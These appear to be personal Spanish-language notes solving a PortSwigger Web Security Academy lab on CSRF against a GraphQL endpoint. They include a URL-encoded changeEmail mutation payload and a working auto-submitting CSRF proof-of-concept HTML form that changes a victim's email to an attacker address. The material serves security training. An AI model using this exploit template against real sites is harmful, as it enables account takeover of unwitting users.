![[Pasted image 20230823135254.png]]

La unica solucion que hay disponible es la de Emanuel Picariello y uso incluso el payload de la resolucion oficial:

![[Pasted image 20230823135745.png]]

query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D

![[Pasted image 20230823140519.png]]

![[Pasted image 20230823140541.png]]

![[Pasted image 20230823140605.png]]

![[Pasted image 20230823140622.png]]

![[Pasted image 20230823140650.png]]

![[Pasted image 20230823140739.png]]

![[Pasted image 20230823140754.png]]

vuelvo a mandar el endpoint al repeater y le cambio el metodo:

![[Pasted image 20230823140941.png]]

![[Pasted image 20230823141003.png]]

vuelvo a cambiarlo a POST:

![[Pasted image 20230823141049.png]]


![[Pasted image 20230823141137.png]]

aca usamos el payload de portswigger:

![[Pasted image 20230823142551.png]]

ahora hago un PoC de CSRF (click derecho, engagement options):

![[Pasted image 20230823142631.png]]

en el boton de options selecciono: Include auto submit script. Copio la parte del form y me voy al exploit server:

![[Pasted image 20230823142848.png]]

![[Pasted image 20230823142936.png]]

el script generado fue este:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a8800b103de299b803fc6bc00830059.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

sin embargo no me funciono, a Picariello el Burp se lo generó asi:

    <form action="https://0a8800b103de299b803fc6bc00830059.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
<script>history.pushState('', '', '/');
document.forms[0].submit();
</script>

yo le moví la posición del script y agregé la función del submit y efectivamente funcionó:

![[Pasted image 20230823143307.png]]
